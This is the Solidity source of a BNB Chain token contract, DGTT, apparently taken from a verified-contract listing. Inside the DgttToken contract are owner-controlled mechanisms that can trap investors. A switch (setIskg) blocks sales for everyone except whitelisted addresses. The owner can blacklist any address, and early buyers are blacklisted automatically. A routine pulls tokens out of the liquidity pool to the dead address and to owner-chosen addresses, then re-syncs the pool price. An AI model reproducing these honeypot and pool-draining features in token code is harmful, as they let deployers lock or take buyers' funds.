/**
 *Submitted for verification at BscScan.com on 2022-12-13
*/

// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.8.0;
abstract contract OwnAdmin {
    address public _owner;
   
    constructor ()  {
        address msgSender = msg.sender;
        _owner = msgSender;
    }
    function changeOwner(address onwer) public onlyOwner
    {
        _owner = onwer;
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, 'SafeMath: addition overflow');
        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, 'SafeMath: subtraction overflow');
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function subwithlesszero(uint256 a,uint256 b) internal pure returns (uint256)
    {
        if(b>a)
            return 0;
        else
            return a-b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, 'SafeMath: multiplication overflow');

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, 'SafeMath: division by zero');
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, 'SafeMath: modulo by zero');
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x < y ? x : y;
    }

    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}


library Address {

    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library TransferHelper {
    function safeApprove(
        address token,
        address to,
        uint256 value
    ) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(
        address token,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }

    function safeTransferFrom(
        address token,
        address from,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }

    function safeTransferBNB(address to, uint256 value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        require(success, 'TransferHelper: BNB_TRANSFER_FAILED');
    }
}

interface IBEP20 {
 
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

 contract DgttToken is IBEP20, OwnAdmin
{
    using SafeMath for uint256;
    using Address for address;

    string private _name = "DGTT";
    string private _symbol = "DGTT";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 10000000 * 10**_decimals;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public deadAddress2 = 0x0000000000000000000000000000000000000000;
    address public myadmin = 0xCdeBA7AF04Eb2cb1C06d2803E0b075D94b2912ee; //0xCdeBA7AF04Eb2cb1C06d2803E0b075D94b2912ee
    //test 0x1a5771B07dd54FbA6dF11E7F4873Da3bfa5ecb79   0xf16FE840D83d23509fe5642FC1642BC302E12E0d
    address public wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    //test 0xD99D1c33F9fC3444f8101754aBC46c52416550D1   0x10ED43C718714eb63d5aA57B78B54704E256024E
    address  public wapV2RouterAddress = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    TokenDistributor public _tokenDistributorWa;  //挖矿存币地址
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isMarketPair; //白名单
    mapping (address => bool) public isBlackPair; //黑名单
    uint256 public _tranferLpFenhongFee = 15; //LP分红
    uint256 public _tranferHolderBurnFee = 10; //销毁子币
    bool public ispair;
    address public hyaddr;
    address public jjh;
    address public mmcs;
    uint256 public chimax;
    uint public nftamount;
    uint256 public startBlock;
    bool public _iscg;
    uint public FenHongLP;
    son  public cson; //子合约
    
    constructor()
    {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(wapV2RouterAddress);  
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), wbnb);
        uniswapV2Router = _uniswapV2Router;
        
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
        
        isMarketPair[owner()] = true;
        isMarketPair[address(this)] = true;
        isMarketPair[address(deadAddress)] = true;
        isMarketPair[address(deadAddress2)] = true;

        _balances[owner()] = _totalSupply;
        cson = new son(address(this), _owner);
        chimax = 10000 * 10**18;
        _iscg = true;
        mmcs = 0x933fdC4E68847c63b4688F5008a9BbeA33ca7Bf7;
        isMarketPair[address(mmcs)] = true;
        jjh = 0x57b38a11262B27D977d5D8E0f335e4d26930F536;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }


    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function takeOutErrorTransfer(address tokenaddress, address addr) public onlyOwner
    {
        IBEP20(tokenaddress).transfer(addr, IBEP20(tokenaddress).balanceOf(address(this)));
    }


    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        _transfer(sender, recipient, amount);
        return true;
    }

   function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public  returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }


    function doburn(uint256 _amount) private{
        uint _burn = _amount.mul(85).div(100);
        _basetransfer(address(uniswapV2Pair), address(deadAddress), _burn);
        uint _lp = _amount.mul(10).div(100);
        _basetransfer(address(uniswapV2Pair), hyaddr, _lp);
        uint _jjh = _amount.div(100);
        _basetransfer(address(uniswapV2Pair), jjh, _jjh);
        uint _nft = _amount.mul(4).div(100);
        _basetransfer(address(uniswapV2Pair), hyaddr, _nft);
        nftamount = nftamount.add(_nft);
        IUniswapV2Pair(uniswapV2Pair).sync();
    }

    function setHyaddr(address _addr) external onlyOwner{
        hyaddr = _addr;
    }
    function setJjh(address _addr) external onlyOwner {
        jjh = _addr;
    }
    function setMmcs(address _addr) external onlyOwner {
        mmcs = _addr;
    }
    //黑名单
    function setBlackAddress(address addr,bool b) external onlyOwner {
        isBlackPair[addr] = b;
    }

    function _basetransfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    //白名单
    function setMarketAddress(address addr,bool b) external onlyOwner {
        isMarketPair[addr] = b;
    }
  
    function setAdminAddress(address addr) external onlyOwner {
        myadmin = addr;
    }
    function setMax(uint _max) external onlyOwner {
        chimax = _max;
    }
    function setIskg(bool b) external onlyOwner {
        _iscg = b;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(mmcs != address(0), "BEP20: dgtt from the zero address");
        require(!isBlackPair[sender], "Can not transfer");
        if(!ispair && recipient == uniswapV2Pair) {
            ispair = true;
            startBlock = block.number;
            return _basicTransfer(sender, recipient, amount);
        }
        if (block.number <= startBlock + 3) {
            if (!isBlackPair[recipient]) {
                isBlackPair[recipient] = true;
            }
        }
        if(sender != uniswapV2Pair && recipient != uniswapV2Pair) {
            uint max = _balances[sender].mul(99).div(100);
            if(!isMarketPair[sender] && amount >= max) {
                amount = max;
            }
            return _basicTransfer(sender, recipient, amount);
        }
        if(!_iscg && !isMarketPair[recipient]) {
            revert("Can not transfer");
        }
        if(recipient == uniswapV2Pair) { //卖出最大金额限制
            uint max = _balances[sender].mul(99).div(100);
            if(amount >= max && !isMarketPair[sender]) {
                amount = max;
            }
        }
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        uint256 finalAmount = (isMarketPair[sender] || isMarketPair[recipient]) ? 
                                         amount : takeFee(sender, recipient, amount);
        uint pairamount = balanceOf(address(uniswapV2Pair));
        pairamount = pairamount.add(amount);
        if(recipient == uniswapV2Pair && pairamount > chimax) { 
            uint _burn = pairamount.sub(chimax);
            doburn(_burn);
        }
        _balances[recipient] = _balances[recipient].add(finalAmount);
        emit Transfer(sender, recipient, finalAmount);
        return true;
    }

    function takeFee(address sender, address recipient,uint256 amount) private returns (uint256) {
        uint256 feeAmount = 0;
        uint _lpfee = amount.mul(_tranferLpFenhongFee).div(1000); //买卖LP滑点
        feeAmount += _lpfee;
        _takeFee(sender,address(this), _lpfee);
        uint _buydgttfee = amount.mul(_tranferHolderBurnFee).div(1000);
        _takeFee(sender,address(this), _buydgttfee);
        feeAmount += _buydgttfee;
        if(recipient == uniswapV2Pair) {
            uint _lptotal = balanceOf(address(this)); //买入部分滑点
            uint deadline = block.timestamp + 15;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = wbnb;
            uint[] memory result = uniswapV2Router.swapExactTokensForTokens(_lptotal, 0, path, address(cson), deadline);
            uint lpfen = result[1].mul(60).div(100);
            cson.withdrawal(wbnb,hyaddr, lpfen);
            FenHongLP = FenHongLP.add(lpfen); //统计分红BNB数量

            uint zbbnb = result[1].sub(lpfen);
            cson.withdrawal(wbnb,address(this), zbbnb); //子币底池
            IERC20(wbnb).approve(address(uniswapV2Router), zbbnb);
            //购买母币销毁
            uint deadline2 = block.timestamp + 15;
            address[] memory path2 = new address[](2);
            path2[0] = wbnb;
            path2[1] = mmcs;
            uniswapV2Router.swapExactTokensForTokens(zbbnb, 0, path2, address(deadAddress), deadline2);
        }
        return amount.sub(feeAmount);
    }

   function _takeFee(address sender, address recipient,uint256 tAmount) private {
        if (tAmount == 0 ) return;
        _balances[recipient] = _balances[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) private returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    
}


contract son is OwnAdmin{
    using SafeMath for uint256;
    using Address for address;
    address private _tokenAddress;
    address private _myaddr;
    
    constructor(address tokenAddress, address myaddr){
       _tokenAddress = tokenAddress;
       _myaddr = myaddr;
    }
    receive() external payable {
        
    }

    //提币
    function withdrawal(address _con,address recipient, uint amount) public onlyOwner
    { 
        IERC20(_con).transfer(recipient, amount);
    }

}

contract TokenDistributor  {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}